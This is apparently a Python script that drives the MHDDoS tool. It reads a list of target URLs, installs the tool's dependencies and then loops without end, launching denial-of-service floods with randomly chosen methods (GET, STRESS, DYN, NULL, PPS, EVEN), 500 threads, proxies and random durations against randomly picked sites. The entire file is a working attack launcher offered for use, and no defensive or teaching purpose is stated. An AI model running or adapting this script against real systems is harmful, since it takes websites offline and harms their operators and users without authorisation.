import random
import os
from time import sleep

socks_type = 0
threads = 500

def get_list_of_urls():
    l = []
    with open('urls.txt') as f:
        l.extend(f.readlines())
    l = map(lambda u: u.strip(), l)
    # filter out not supported links
    l = filter(lambda u: u and u.startswith("http"), l)
    return list(l)

urls = get_list_of_urls()
methods = [
    # "CFB", 
    # "BYPASS", 
    "GET", 
    # "POST", 
    # "OVH", 
    "STRESS",
    "DYN", 
    # "SLOW", 
    # "HEAD", 
    "NULL", 
    # "COOKIE", 
    "PPS",
    "EVEN", 
    # "GSB", 
    # "DGB", 
    # "AVB"
]

proxylist_filename = "proxylist.txt"
os.chdir("MHDDoS")
os.system("mkdir -p files/proxies/")
os.system("touch files/proxies/%s" % proxylist_filename)
os.system("pip3 install -r requirements.txt")

while True:
    url = random.choice(urls)
    method = random.choice(methods)
    rpc = random.randrange(1, 20)
    duration = random.randrange(10, 30)

    # Delegate DOS-attack to a script that was written by the guys who
    # actually know what they are doing.
    command = """python3 start.py {method} "{url}" {socks_type} {threads} proxylist.txt {rpc} {duration}"""\
        .format(
            method=method,\
            url=url,\
            socks_type=socks_type,\
            threads=threads,\
            rpc=rpc,\
            duration=duration
        )
    print("Executing the '%s' command." % command)
    stream = os.popen(command)
    output = stream.read()

    sleep(1)
